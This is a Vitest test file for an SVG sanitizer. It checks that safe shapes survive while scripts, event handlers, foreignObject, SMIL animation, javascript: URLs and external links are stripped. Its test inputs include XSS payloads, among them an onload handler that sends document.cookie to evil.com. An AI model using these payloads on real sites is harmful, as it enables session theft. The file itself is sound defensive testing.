import { describe, expect, it } from 'vitest';

import { sanitizeSvg } from './sanitize-svg';

describe('sanitizeSvg', () => {
  it('preserves valid safe vector elements and attributes', () => {
    const safeSvg =
      '<svg xmlns="http://www.w3.org/2000/svg" width="480" height="320" viewBox="0 0 480 320"><g><line x1="0" y1="0" x2="100" y2="100" stroke="#000000" stroke-width="1.5" /><circle cx="50" cy="50" r="25" fill="#ffffff" /><text x="10" y="20" font-size="14">A</text></g></svg>';

    const result = sanitizeSvg(safeSvg);
    expect(result).toContain('<svg');
    expect(result).toContain('</svg>');
    expect(result).toContain('line');
    expect(result).toContain('circle');
    expect(result).toContain('text');
  });

  it('strips <script> tags and their contents completely (Stored XSS)', () => {
    const maliciousSvg =
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script><circle cx="10" cy="10" r="5" /></svg>';

    const result = sanitizeSvg(maliciousSvg);
    expect(result).not.toContain('script');
    expect(result).not.toContain('alert');
    expect(result).toContain('circle');
  });

  it('strips inline event handlers like onload, onerror, onclick', () => {
    const maliciousSvg =
      '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil.com/?c=\' + document.cookie)"><circle cx="10" cy="10" r="5" onclick="alert(1)" /></svg>';

    const result = sanitizeSvg(maliciousSvg);
    expect(result).not.toContain('onload');
    expect(result).not.toContain('onclick');
    expect(result).not.toContain('fetch');
    expect(result).not.toContain('evil.com');
    expect(result).toContain('circle');
  });

  it('strips <foreignObject> containers completely', () => {
    const maliciousSvg =
      '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="50"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script><p>Text</p></body></foreignObject><rect x="0" y="0" width="10" height="10" /></svg>';

    const result = sanitizeSvg(maliciousSvg);
    expect(result).not.toContain('foreignObject');
    expect(result).not.toContain('foreignobject');
    expect(result).not.toContain('script');
    expect(result).toContain('rect');
  });

  it('strips <animate> and SMIL animation tags', () => {
    const maliciousSvg =
      '<svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100"><animate attributeName="x" onbegin="alert(1)" /></rect></svg>';

    const result = sanitizeSvg(maliciousSvg);
    expect(result).not.toContain('animate');
    expect(result).not.toContain('onbegin');
  });

  it('allows safe base64 data URLs for image tags but rejects javascript: and external URLs', () => {
    const safeImageSvg =
      '<svg xmlns="http://www.w3.org/2000/svg"><image x="0" y="0" width="50" height="50" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY44YAAAAASUVORK5CYII=" /></svg>';
    expect(sanitizeSvg(safeImageSvg)).toContain('data:image/png;base64');

    const maliciousImageSvg =
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="javascript:alert(1)" /><image href="https://evil.com/tracker.svg" /></svg>';
    const cleaned = sanitizeSvg(maliciousImageSvg);
    expect(cleaned).not.toContain('javascript');
    expect(cleaned).not.toContain('https://evil.com');
  });

  it('returns empty string for empty, whitespace or non-SVG strings', () => {
    expect(sanitizeSvg('')).toBe('');
    expect(sanitizeSvg('   ')).toBe('');
    expect(sanitizeSvg('<div>Not an SVG</div>')).toBe('');
    expect(sanitizeSvg('<script>alert(1)</script>')).toBe('');
  });
});
